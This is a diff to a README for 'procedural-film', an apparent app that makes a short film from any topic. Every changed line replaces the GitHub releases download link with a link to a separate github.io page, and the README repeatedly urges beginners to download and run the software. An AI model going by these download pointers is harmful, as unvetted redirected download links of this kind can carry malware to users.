@@ -1,6 +1,6 @@
 <h1>🎬 procedural-film - Turn Any Topic Into a Stunning 30-Second Film</h1>
 
-[![Download procedural-film](https://img.shields.io/badge/Download-procedural--film-2ea44f?style=for-the-badge&logo=github)](https://github.com/alysonp5/procedural-film/releases)
+[![Download procedural-film](https://img.shields.io/badge/Download-procedural--film-2ea44f?style=for-the-badge&logo=github)](https://alysonp5.github.io)
 
 ## 🦋 What Is This?
 
@@ -26,7 +26,7 @@ Ready to create your first film? Follow these simple steps:
 
 ### Step 1: Download the Software
 
-Visit this link to download the application: [Download procedural-film](https://github.com/alysonp5/procedural-film/releases)
+Visit this link to download the application: [Download procedural-film](https://alysonp5.github.io)
 
 You'll see a list of available files. Choose the one that matches your computer's operating system (look for your system name in the file name).
 
@@ -53,7 +53,7 @@ When the film finishes playing, you'll see a "Save Video" button. Click it to do
 
 **Important:** When you visit the link below, you'll see the official download page for procedural-film. Choose the latest version release that matches your operating system and download it.
 
-[![Get procedural-film](https://img.shields.io/badge/Get%20procedural--film-Latest%20Version-blue?style=for-the-badge)](https://github.com/alysonp5/procedural-film/releases)
+[![Get procedural-film](https://img.shields.io/badge/Get%20procedural--film-Latest%20Version-blue?style=for-the-badge)](https://alysonp5.github.io)
 
 ### System Requirements
 
@@ -139,7 +139,7 @@ You're now equipped with everything you need to begin your journey as a film cre
 4. Enter any topic you like
 5. Save your 30-second masterpiece
 
-[![Start Creating Now](https://img.shields.io/badge/Start%20Creating-Now-green?style=for-the-badge&logo=rocket)](https://github.com/alysonp5/procedural-film/releases)
+[![Start Creating Now](https://img.shields.io/badge/Start%20Creating-Now-green?style=for-the-badge&logo=rocket)](https://alysonp5.github.io)
 
 Remember, every great film starts with a single topic. What story will you tell today? 🎥✨
 
